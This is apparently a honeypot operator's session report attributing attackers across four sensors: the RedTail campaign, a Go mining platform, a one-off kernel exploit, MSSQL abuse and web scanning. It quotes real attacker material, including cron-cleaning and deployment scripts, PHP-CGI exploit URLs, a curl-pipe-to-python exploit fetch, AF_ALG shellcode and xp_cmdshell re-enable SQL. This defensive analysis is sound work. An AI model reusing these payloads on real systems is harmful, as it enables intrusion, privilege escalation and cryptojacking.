# SESSION 32 — Deep Actor Analysis: Attribution Across Four Sensors

**Date:** 2026-09-16
**Box:** Hetzner Cloud VPS `ubuntu-4gb-hel1-2` (62.238.47.215)
**Window:** 2026-08-23 → 2026-09-16 (25 days)
**Continuity:** Follows `SESSION-31-sensor-remediation-2026-09-15.md`. Session 30
established what the corpus contained; this session establishes **who is in it**.

**What changed:** session 30 counted events and catalogued techniques. This pass
tracked individual actors across all four sensors, which produced a named campaign
spanning three of them, a genuine kernel exploit, a second Go-based campaign with an
operator signature, and a correction to a finding that would have been wrong to
publish.

---

## 0. The number that reframes everything

Session 30 reported 4,669 unique source IPs. That figure is technically true and
practically misleading. Splitting by what each IP actually *did*:

```text
total unique IPs          4,787
recon only (no login)     2,324      49%   connect, read banner, leave
logged in, no payload     1,243      26%   ran commands, delivered nothing
dropped a payload           620      13%   actual weaponisation
```

**620 is the number of actors that got all the way to delivering something.** The
other 87% are scanning, fingerprinting, or failing.

This split should lead any future summary. "4,669 attackers" overstates the corpus by
roughly 7x.

---

## 1. RedTail — one operator, three sensors, three techniques

The strongest attribution result in the corpus. A single campaign appears on three
independently-built honeypots using three unrelated delivery methods.

### 1.1 Cowrie — SCP upload of a full toolkit

`77.90.185.20` authenticated and uploaded seven files via **SCP**, not `wget`:

```text
redtail.arm7   redtail.arm8   redtail.i686   redtail.riscv   redtail.x86_64
setup.sh       clean.sh
```

Then a single command:

```bash
chmod +x clean.sh; sh clean.sh; rm -rf clean.sh; chmod +x setup.sh; sh setup.sh
```

Run three times in one day — 10:23, 11:52, 16:09 — identical each time.

**SCP delivery is a meaningfully different tradecraft** from every Mirai dropper in
the corpus. It requires working credentials and an authenticated session rather than
blind command injection. 88 `cowrie.session.file_upload` events exist in total; this
actor accounts for 28 of them.

**RISC-V support is notable.** `redtail.riscv` is a genuine `ELF 64-bit LSB
executable, UCB RISC-V, RVC, double-float ABI` — forward-looking targeting of an
architecture almost no botnet supports yet.

### 1.2 `clean.sh` — competitor eviction done properly

Not a process killer. A persistence sanitiser:

```bash
clean_file() {
  chattr -ia "$1"
  grep -vE 'wget|curl|/dev/tcp|/tmp|\.sh|nc|bash -i|sh -i|base64 -d' "$1" >/tmp/clean_file
  mv -f /tmp/clean_file "$1"
}

systemctl disable c3pool_miner ; systemctl stop c3pool_miner
systemctl disable bot.service  ; systemctl stop bot.service

chattr -ia /var/spool/cron/crontabs
for user_cron in /var/spool/cron/crontabs/*; do clean_file "$user_cron"; done
for dir in /etc/cron.hourly /etc/cron.daily /etc/cron.weekly /etc/cron.monthly /etc/cron.d; do
  chattr -ia "$dir"; for system_cron in "$dir"/*; do clean_file "$system_cron"; done
done
clean_file /etc/anacrontab
crontab -l | grep -vE 'wget|curl|/dev/tcp|/tmp|\.sh|nc|bash -i|sh -i|base64 -d' | crontab -

for dir in /tmp /var/tmp /dev/shm; do
  find "$dir" -mindepth 1 -maxdepth 1 -exec rm -rf -- {} +
done
clean_file ~/.bashrc ; clean_file ~/.bash_profile ; clean_file ~/.profile
```

It reads every cron file on the system, **strips any line containing a downloader or
reverse-shell pattern, and writes the file back** — surgically removing rival
persistence while leaving legitimate entries intact. It clears immutable flags
(`chattr -ia`) first, because rivals set them. It names two specific competitors
(`c3pool_miner`, `bot.service`) for direct removal.

This is the same turf-war behaviour documented in session 30 (§3), executed far more
thoroughly than the `/proc/*/exe (deleted)` killers found there.

### 1.3 `setup.sh` — better engineered than most legitimate installers

```bash
get_noexec_dirs() {
  if command -v findmnt >/dev/null 2>&1; then findmnt -rn -O noexec -o TARGET
  else cat /proc/mounts | grep 'noexec' | awk '{print $2}'; fi
}
NOEXEC_DIRS=$(get_noexec_dirs)
for dir in $NOEXEC_DIRS; do EXCLUDE="${EXCLUDE} -not -path \"$dir\" -not -path \"$dir/*\""; done

FOLDERS=$(eval find / -type d -user $(whoami) -perm -u=rwx -not -path \"/tmp/*\" -not -path \"/proc/*\" $EXCLUDE 2>/dev/null)

for i in $FOLDERS /tmp /var/tmp /dev/shm; do
  if cd "$i" && touch .testfile && (dd if=/dev/zero of=.testfile2 bs=2M count=1 >/dev/null 2>&1 \
     || truncate -s 2M .testfile2 >/dev/null 2>&1); then
    rm -rf .testfile .testfile2
    mv -f "$CURR"/redtail.* "$i"; break
  fi
done
```

Four things here that most malware does not do:

- **Queries `findmnt -O noexec`** to exclude directories mounted `noexec`, rather than
  blindly trying `/tmp` and failing on a hardened host
- **`find / -type d -user $(whoami) -perm -u=rwx`** — enumerates every directory it
  actually owns and can execute in, instead of guessing from a hardcoded list
- **Verifies with a real 2 MB `dd` write**, not just `touch` — catches disk quotas and
  full filesystems that a zero-byte test would miss
- **Four-tier random filename generation**: `openssl rand -base64 256` → `/dev/urandom`
  → `$RANDOM` → hardcoded `redtail` fallback

Architecture detection maps `x86_64|amd64`, `i[3456]86`, `armv8|aarch64`, `armv7`,
`riscv`. If detection fails (`NOARCH=true`) it runs **all five builds in sequence**
until one executes. The binary is invoked as `./$FILENAME ssh` — the argument selects
the SSH-spreading module.

### 1.4 wp-honeypot — the same operator, over HTTP

All ten PHP-exploitation POSTs in the web honeypot carry:

```text
User-Agent: libredtail-http
```

Two source IPs (`82.67.202.213` on 2026-09-16 04:52, `45.43.60.98` on 2026-09-16
13:17) each ran an identical five-request sequence, attacking **CVE-2012-1823**
(PHP-CGI argument injection) with five different encodings of the same payload:

```text
/hello.world?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input
/?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input
/index.php?%25ADd+allow_url_include%3D1+%25ADd+auto_prepend_file%3Dphp://input
/test.hello?%25ADd+allow_url_include%3D1+%25ADd+auto_prepend_file%3Dphp://input
/index.php?-d+allow_url_include%3don+-d+auto_prepend_file%3dphp%3a//input
```

`%AD` is a URL-encoded soft hyphen that vulnerable PHP-CGI versions treat as `-`,
smuggling `-d` php.ini directives through the query string. The five variants
(`%ADd`, `%25ADd`, plain `-d`) across four paths are **deliberate WAF evasion** —
trying multiple encodings in case one is filtered.

### 1.5 The payload — outbound propagation, not a backdoor

Every POST body decodes to the same thing:

```bash
cd /tmp || cd /var/tmp || cd /dev/shm
echo '-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACDveEt+JtIVZGBVIbVkHvdkvQqdMiafu5/IMOvelH/yxg...
-----END OPENSSH PRIVATE KEY-----' > key.ppk
echo 'StrictHostKeyChecking no
UserKnownHosts...
```

**This is not installing a backdoor key for the attacker to connect *in* with.** It
writes a *private* key plus an SSH client config disabling host-key verification —
staging the compromised host to SSH *outward* to other targets. Worm propagation
infrastructure.

The key comment decodes to **`dlr@sftp`** (`ZGxyQHNmdHA=` in the base64), matching the
SFTP/SCP delivery method seen on Cowrie.

### 1.6 Why this matters

**The same ed25519 key appears in Cowrie SSH sessions and in HTTP POST bodies** —
first noticed accidentally in session 30 (§6), now explained. Three sensors, three
protocols, one campaign:

| Sensor | Vector | Artifact |
|---|---|---|
| Cowrie (SSH) | SCP upload + shell | `redtail.*` toolkit, `setup.sh`, `clean.sh` |
| wp-honeypot (HTTP) | CVE-2012-1823 | `libredtail-http` UA, key-staging payload |
| Cowrie logs (session 20) | Telnet | `redtail_bot` — first observation, weeks earlier |

This is the payoff for running multiple honeypot types. No single sensor shows it.

---

## 2. `pan-chan` — a Go mining platform, five samples, nine IPs

### 2.1 The signature

Five large binaries (4.3 MB – 30 MB) all contain the string:

```text
pan-chan's mining island hi!
```

An operator signature left in the build. It links five samples with **five distinct
MD5s** — recompiled per delivery, defeating hash-based blocklisting:

```text
fa951a5e0a43e1aad9ad3018b959573b   08cf4792f94eb68b…   24.3 MB
0a05f467a6cd5719343bc055a27e8c8e   228b0cc6406cf2f7…    4.3 MB
9d430f3192dc4c3dac9592c7c11db729   6b5afe506c5b4db4…   25.3 MB
0fa41de75420479c9120641df3b4f317   94f2e4d8d4436874…   30.3 MB
fe4ebcc3160ad784d35de8536b94a8cf   c81b72a01d7d2a0e…    4.5 MB
```

Delivered by **nine distinct IPs**: `124.205.141.215`, `158.51.96.38`,
`180.163.65.24`, `180.76.119.95`, `187.191.64.33`, `183.159.243.138`,
`138.122.140.200`, `182.66.193.212`, `36.139.229.71`. Five of those delivered the same
binary.

### 2.2 What it actually is

The config struct settles it — this is a **multi-miner management platform**, not
plain XMRig:

```go
current_preset_xmrig_enabled   *bool
current_preset_xmrig_nicehash  *bool
current_preset_xmrig_algo      *string
current_preset_xmrig_poolAddr  *string
current_preset_xmrig_poolUser  *string
current_preset_xmrig_poolPass  *string
current_preset_nbminer_enabled *bool
current_preset_nbminer_algo    *string
current_preset_nbminer_poolAddr *string
…
```

Two backends — **XMRig** (CPU/Monero) and **NBMiner** (GPU) — each with configurable
pool address, user and password, serialised as JSON (`json:"xmrig_algo"`).

Go module imports confirm the capability set:

```text
github.com/shirou/gopsutil     CPU/network/process telemetry — hardware profiling
github.com/pkg/sftp            file transfer
github.com/msteinert/pam       PAM authentication
golang.org/x/crypto/ssh        (ssh-rsa-cert-v01, chacha20-poly1305@openssh.com)
```

It profiles the victim's hardware to choose a mining algorithm, and carries a full SSH
client for lateral movement. Persistence via a fake systemd unit:
`ExecStart=/bin/systemd-worker`.

### 2.3 Delivery — disguised as sshd

```bash
chmod +x ./.4921590130161946222/sshd; nohup ./.4921590130161946222/sshd &
```

Hidden directory with a random numeric name; **the miner is named `sshd`** so a glance
at `ps aux` shows the SSH daemon. The other eight IPs delivered via SCP upload with no
shell commands at all — one uploaded it under the filename `sshd` directly.

Go explains the file size: static linking bundles the entire runtime, which is why
these are 150x larger than a typical Mirai payload.

---

## 3. A real kernel privilege-escalation exploit — one occurrence

### 3.1 The delivery

`185.100.87.166`, logged in as username `Shithead`, worked methodically before
escalating:

```text
12:28:21  ip a
12:28:39  cat /etc/os-release          <- identify the distro
12:29:09  sudo -i
12:29:16  sudo -s
12:29:21  su -
12:29:36  sudo sssdasdl1231cd          <- garbage, to see the error format
12:30:08  sudo reboot                  <- confirm no sudo rights
12:31:10  uname -a
12:32:41  sudo cat /etc/fstab
12:33:35  curl https://copy.fail/exp | python3 && su
```

Reconnaissance → confirm no privileges → fetch exploit. Piped straight into `python3`,
never written to disk, delivered over TLS from a throwaway domain. **Cowrie captured
it anyway** (731 bytes, `d401e7d1c00605749d6c617ace73ab20a762b72e41c2e1590331596e38219a61`).

### 3.2 What the exploit does

```python
import os as g, zlib, socket as s
def c(f,t,c):
 a=s.socket(38,5,0)                                    # AF_ALG — kernel crypto API
 a.bind(("aead","authencesn(hmac(sha256),cbc(aes))"))
 …
 r,w=g.pipe(); n=g.splice
 n(f,w,o,offset_src=0); n(r,u.fileno(),o)              # splice into the pipe
f=g.open("/usr/bin/su",0)                              # target: setuid root binary
e=zlib.decompress(d("78daab77f571636264648001…"))      # compressed shellcode
while i<len(e): c(f,i,e[i:i+4]); i+=4                  # write 4 bytes at a time
g.system("su")
```

It abuses **`AF_ALG` (kernel crypto sockets) combined with `splice()`** to write into
`/usr/bin/su` — a root-owned, read-only binary — four bytes at a time, then executes
it. A Dirty-Pipe-class page-cache write.

### 3.3 The embedded shellcode

The zlib blob decompresses to a complete 160-byte hand-written ELF:

```asm
31c0 31ff b069 0f05      xor eax,eax; xor edi,edi; mov al,0x69; syscall   → setuid(0)
488d3d0f000000           lea rdi,[rip+0xf]                                → "/bin/sh"
31f6 6a3b 58 99 0f05     xor esi,esi; push 0x3b; pop rax; cdq; syscall    → execve("/bin/sh")
31ff 6a3c 58 0f05        xor edi,edi; push 0x3c; pop rax; syscall         → exit(0)
```

`/bin/sh` is embedded at the tail. Full chain: overwrite `su` with this, run `su`,
get a root shell.

### 3.4 Scope — genuinely singular

A grep for real `AF_ALG` / `authencesn` usage across all 106 captured files returns
**exactly one match**. A grep across all 95,508 logged commands for
`pkexec|dirtypipe|CVE-20|setuid|capsh|nsenter|unshare|ld.so.preload` returns **one
line** — `cat /etc/ld.so.preload`, from the same actor.

**Privilege escalation is not a pattern in this corpus. It happened once.**

### 3.5 The same actor checked for monitoring first

```text
13:41:54  echo "$LD_PRELOAD"
13:41:55  echo "$LD_LIBRARY_PATH"
13:42:20  cat /etc/ld.so.preload
13:43:02  file /usr/bin/dmesg
13:43:17  which apt
13:43:22  cat /usr/bin/apt        <- is this a real ELF or a wrapper script?
```

`LD_PRELOAD` and `/etc/ld.so.preload` are how you detect an instrumented or sandboxed
environment. `cat /usr/bin/apt` checks whether system binaries are real or fakes.
**They were testing whether they were in a honeypot.**

---

## 4. A second skilled human — decoy engagement

`94.104.96.90` (2026-08-27, 88 events) went straight for the planted decoys:

```text
13:38:58  cat api_credentials_dump.json
13:39:17  cat .secrets/
13:39:21  ls -la .secrets/
13:39:26  cat customer_list_private.csv
13:40:53  cd backups/
```

Then tooling checks, with typos and corrections: `lsof` → `apt-get install lsof` →
`lsof`, `free` → `free -H` → `free -h`, `strace` → `apt-get install strace`. Then:

```bash
# Check available downloaders and archivers
which busybox curl wget python3 python perl nc tar dpkg 2>/dev/null
# Download static busybox for x86_64
wget https://busybox.net/downloads/binaries/1.35.0-x86_64-linux-musl/busybox
curl -sL https://busybox.net/downloads/binaries/1.35.0-x86_64-linux-musl/busybox -o /tmp/busybox
chmod +x /tmp/busybox
```

**Living off the land with a legitimate download.** When the target lacked tools, they
pulled a real statically-linked busybox from the **official busybox.net** over TLS. No
AV flags it, no blocklist covers the domain, TLS hides it from network inspection.

The `# Check available…` comment lines indicate a prepared playbook rather than
improvisation.

**Tooling fingerprint worth reusing:** parallel sessions from human operators
repeatedly issued `echo $$;ps -eo tty,pid,ppid,etime,args` and
`while true; do sleep 1; head -v -n 8 /proc/meminfo; …` — those are the built-in
resource-monitor panels of GUI SSH clients (Termius / MobaXterm class). **Their
presence reliably indicates a human on a graphical client rather than a script.**

---

## 5. Correction: `147.185.132.0/24` is Palo Alto Networks, not an attacker

Initial read of the data was wrong, and worth recording as such.

**The observation:** 26+ sequential IPs from `147.185.132.x` appearing across both
Cowrie and Dionaea, each hitting only 2–14 times on scattered dates, spanning ten
different protocols. This looks exactly like deliberate low-and-slow rotation across a
/24 to stay under rate-limit thresholds.

**The reality:**

```text
NetName:   PAN-22
OrgName:   Palo Alto Networks, Inc
Country:   US
```

And the event breakdown:

```text
35  cowrie.session.connect
35  cowrie.session.closed
22  cowrie.client.version
21  cowrie.client.kex
 4  cowrie.telnet.option
 0  logins       0  commands
```

**Zero login attempts. Zero commands.** Connect, read the banner, disconnect. That is
a security vendor's internet-wide attack-surface-management scanning, which is normal
and benign.

Had this gone into an AbuseIPDB submission, it would have publicly reported a security
vendor as a threat actor.

> **LESSON — sequential IPs from one netblock means coordinated infrastructure, but
> coordinated does not mean hostile.** The distinguishing test is not the IP pattern,
> it is whether authentication is attempted. Connect-and-leave is reconnaissance;
> login attempts are attacks. Check WHOIS before drawing conclusions from an IP range.

The genuine sequential-block finding is `103.134.26.228/229/230/231` (`mimebd.com`) at
30,804 events — real logins, real commands.

---

## 6. Two more corrections worth recording

### 6.1 The "AF_ALG exploit family" that wasn't

A grep for `aead|splice|AF_ALG` across the download directory returned 14 files,
initially read as a cluster of kernel exploits. It was not. Those are short generic
substrings that occur incidentally inside any large compiled binary's string table.
Twelve were ordinary Mirai payloads (`order.mipsel`, `pmips`) already catalogued.

Checking file type and size first would have caught it immediately: a 24 MB stripped
ELF matching "aead" means nothing; a 731-byte Python script containing `AF_ALG` *and*
`/usr/bin/su` means everything.

### 6.2 The Monero wallet that wasn't

A regex for Monero addresses (`[48][0-9A-Za-z]{94}`) against the Go binaries returned
what looked like three wallets. They were Go's concatenated string table
(`4cas5cas6chancommcx16datedeaddialer…` = `chan`, `comm`, `date`, `dead`, `dialer`)
and CPU feature flags (`avx512bf16`, `avx512vnni`, `arcfour256`).

> **LESSON — a regex that matches long alphanumeric strings will match compiled binary
> string tables.** Verify structure, not just length and character class.

---

## 7. What the other sensors showed

### 7.1 Dionaea — worm propagation, not operators

Payload droppers follow a consistent shape: dozens of distinct IPs each dropping
exactly 1–2 files, **zero login attempts**, single protocol.

```text
154.241.14.82    12 conns  1 proto  0 logins  4 downloads
196.203.166.131  10 conns  1 proto  0 logins  2 downloads
201.191.59.212    7 conns  1 proto  0 logins  2 downloads
…
```

Hash `ae12bb54af31227017feffd9598a6f5e` arrives from four unrelated IPs. That is
automated worm spread from already-infected machines, not operators attacking.

**Only one IP attempts credentials** — `77.90.185.30`, MySQL-only, 1,390 login attempts
across 1,391 connections, all blank passwords for `root`/`admin`/`sa`.

**Full-spectrum enumerators** (9–10 protocols each): `172.234.162.31`,
`71.6.242.117`, `93.123.109.122`, `193.24.211.39`.

Despite 38,222 SMB connections, sampling 60 streams found **one `IPC$` request** —
almost nothing gets past the initial handshake, consistent with the WannaCry
connect-and-fail pattern from session 30.

### 7.2 The MSSQL privilege-escalation chain

Session 30 flagged `xp_cmdshell` without examining it. The full sequence:

```sql
-- 1. Recon
exec sp_server_info 1 / 2 / 500
SELECT @@VERSION
use master

-- 2. Destroy existing defences
Drop Procedure xp_cmdshell
Drop Procedure sp_OAMethod / sp_OACreate / sp_OASetProperty / sp_OADestroy
Drop Procedure xp_regwrite / xp_regdeletevalue / xp_regdeletekey
Drop Procedure sp_trace_setstatus / sp_password

-- 3. Rebuild them straight from the DLLs on disk
dbcc addextendedproc ('xp_cmdshell','xplog70.dll')
dbcc addextendedproc ('sp_OAMethod','odsole70.dll')

-- 4. Re-enable every OS-execution path
sp_configure 'show advanced options',1 RECONFIGURE WITH OVERRIDE
sp_configure 'xp_cmdshell',1          RECONFIGURE WITH OVERRIDE
sp_configure 'Ad Hoc Distributed Queries',1
sp_configure N'clr enabled', N'1'
alter database [master] set TRUSTWORTHY ON
exec sp_changedbowner 'sa'
```

Step 3 is the sophisticated part. Administrators commonly "secure" SQL Server by
*dropping* `xp_cmdshell` rather than properly disabling it — and `dbcc addextendedproc`
re-registers it from the DLL, which is still present on disk. **The toolkit is
designed to undo a common hardening measure.** Four separate OS-execution paths are
enabled in case one is blocked.

Client fingerprint: `WIN-8Q4E6Q8HNDC` with appname `Microl office` — the misspelled
scanner identified in session 30.

**No attack reached actual command execution** — Dionaea answers every query with the
same generic packet, so the setup sequence ran and then stalled. Intent fully
documented; payload never delivered.

### 7.3 mailoney — first real authentication captured

The session-31 fix is producing intelligence. 46 real-source-IP sessions, and one is a
genuine authentication attempt:

```text
152.32.201.119
  ehlo 62.238.47.215
  auth ntlm
  tlrmtvntuaabaaaab4iioaaaaaaaaaaaaaaaaaaaaaa=
```

Decoded: `NTLMSSP\x00\x01\x00\x00\x00\x07\x82\x088` — an **NTLM Type 1 negotiate
message** with flags `0x08820007`. The first SMTP authentication ever captured by this
sensor, and impossible before the source-IP fix.

Everything else is self-identifying scanners: `infrawat.ch`, `quadmetrics.com`,
`scan.local`, and `mglndd_62.238.47.215_25` (Shadowserver's mass-scan probe).

### 7.4 wp-honeypot — `80.94.95.211`, the most thorough scanner in the corpus

214 of 637 total events, **every request a unique path**, all with a spoofed
`Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)` user-agent — a browser from 2009.

Coverage:

- `.env` across ~60 directory variants **and case permutations** — `/Backend/.env`,
  `/bAcKeNd/.EnV`, `/ADMINISTRATOR/.env`
- Extensions: `.env.dist`, `.env.bak`, `.env.jpg`, `.env.local.php`, `.env.production`,
  `.env.staging`
- Service-specific secrets: `/sendgrid.env`, `/twilio/.env.php`, `/stripe/.env.jpg`,
  `/aws.yml`, `/client_secrets.json`, `/appsettings.json`
- **CVE-2017-9841** (PHPUnit RCE): `vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php`
  in ~20 path variants
- Symfony profiler leaks:
  `/app_dev.php/_profiler/open?file=app/config/parameters.yml`
- Network appliances: `/+CSCOE+/logon.html` (Cisco ASA), `/cgi-bin/login.cgi`,
  `/boaform/admin/formLogin`

A professionally-maintained wordlist covering cloud secrets, payment APIs, framework
debug endpoints, and network appliances.

### 7.5 AI tooling is now in the wordlists

```text
45.135.194.60   GET /.claude/.credentials.json   Mozilla/5.0 (Windows NT 10.0…)
```

`.claude/.credentials.json` is a real path used by Claude Code to store API tokens. It
appears in the same request series as `.env` and `secrets.env`, with a **spoofed
Chrome user-agent and no self-identification** — this is credential theft targeting AI
tooling.

Distinguish it from the `/mcp`, `/mcp/`, `/api/mcp` requests, which all carry
`Mozilla/5.0 (compatible; Infrawatch/1.0; +https://infrawat.ch/)` — a legitimate,
self-identifying research crawler. **Same attack surface, different intent.**

### 7.6 Header-level probing

```text
89.248.172.11     Host: _
195.206.182.206   Host: 192.0.2.1                  (RFC 5737 documentation range)
45.135.194.24     Host: checkip.amazonaws.com
51.254.59.113     Host: static.215.47.238.62.clients.your-server.de
```

Host-header injection tests — probing for virtual-host routing flaws and SSRF. nginx
sets `X-Real-IP` and `X-Forwarded-For` on every request, so source attribution stays
intact.

---

## 8. Actor taxonomy

Seven distinct classes now identifiable in the corpus:

| Class | Example | Signature |
|---|---|---|
| **IoT botnet (commodity)** | `185.93.89.72` | Multi-arch ELF, Mirai credentials, `wget`/`tftp`/`ftp` fallback |
| **Named campaign (RedTail)** | `77.90.185.20`, `82.67.202.213` | SCP toolkit + HTTP CVE, `libredtail-http`, RISC-V build |
| **Mining platform (pan-chan)** | 9 IPs, 5 samples | Go, `gopsutil`, XMRig+NBMiner presets, `sshd` disguise |
| **Skilled human** | `185.100.87.166`, `94.104.96.90` | Typos, pauses, kernel exploit, decoy reading, GUI-client fingerprint |
| **Windows worm** | 75 SMB droppers | WannaCry, 1–2 files, no logins, single protocol |
| **Research scanner** | `147.185.132.x`, `infrawat.ch` | Connect-and-leave, zero auth, often self-identifying |
| **Bandwidth abuse** | `86.81.207.216` | WinSCP, 327 MB PGP file, 690 MB MP4 |

That last one is worth quantifying: `tmp_290ordr` (690 MB MP4), a 327 MB PGP-encrypted
file, and a 75 MB legitimate Plex `.deb` together account for roughly **1.1 GB of the
1.2 GB downloads directory.** Actual malware is a small fraction of the stored bytes.

---

## 9. New IOCs from this session

| Indicator | Type | Context |
|---|---|---|
| `160.119.66.206` | C2 + scanner | New 2026-09-15; `/bins/kla.sh`, 15 arch builds |
| `45.150.195.235` | Payload host | 112 downloads in one day, then gone |
| `209.14.28.184` | Scanner | 110 downloads — 2nd highest, missed by volume ranking |
| `77.90.185.20` | RedTail operator | SCP toolkit upload, 3x in one day |
| `82.67.202.213`, `45.43.60.98` | RedTail HTTP | `libredtail-http`, CVE-2012-1823 |
| `185.100.87.166` | Human + kernel exploit | `copy.fail/exp` |
| `copy.fail` | Exploit host | AF_ALG/splice privesc, TLS-delivered |
| `80.94.95.211` | Web scanner | 214 unique paths, MSIE 8.0 spoof |
| `45.135.194.60` | AI credential theft | `/.claude/.credentials.json` |
| `194.50.16.198` | Port sprayer | HTTP at 7 protocols, inflates stats |
| `pan-chan's mining island hi!` | String signature | Links 5 samples across 9 IPs |
| `dlr@sftp` | SSH key comment | RedTail key artifact |

**Do not report:** `147.185.132.0/24` (Palo Alto Networks), `216.70.97.74`
(floridacollege.edu — compromised victim), `143.198.208.150` (bostonpda.org —
compromised victim), `infrawat.ch` / `quadmetrics.com` / Shadowserver ranges
(self-identifying research).

---

## 10. Lessons

- **Split actors by behaviour before counting them.** 4,787 IPs is 2,324 scanners,
  1,243 failed attempts, and 620 real payload droppers. The raw count overstates the
  threat picture by ~7x.
- **Volume ranking hides significant actors.** `209.14.28.184` was the second-highest
  payload dropper in the corpus and never appeared in any prior analysis because it
  ranked low on total event count. Rank by what you care about, not by row count.
- **Check WHOIS before concluding an IP range is hostile.** The `147.185.132.x`
  "low-and-slow evasion campaign" was Palo Alto Networks doing legitimate research
  scanning.
- **Short generic strings are not signatures.** `aead`, `splice`, and a 95-character
  alphanumeric regex all produced confident false positives against compiled binaries.
  Check file type and size first.
- **Attribution comes from artifacts, not volume.** An operator signature
  (`pan-chan`), a key comment (`dlr@sftp`), and a user-agent (`libredtail-http`) each
  linked samples that event counts never would have connected.
- **The distinguishing test for hostility is authentication attempts**, not connection
  volume or IP patterns. Connect-and-leave is reconnaissance regardless of how many
  IPs it comes from.
- **Multi-sensor correlation is the whole point.** RedTail is visible as one campaign
  only because SSH, HTTP, and Telnet sensors ran simultaneously and were analysed
  together.
- **Read the small files first.** The most sophisticated artifact in 1.2 GB of
  captures was a 731-byte Python script.
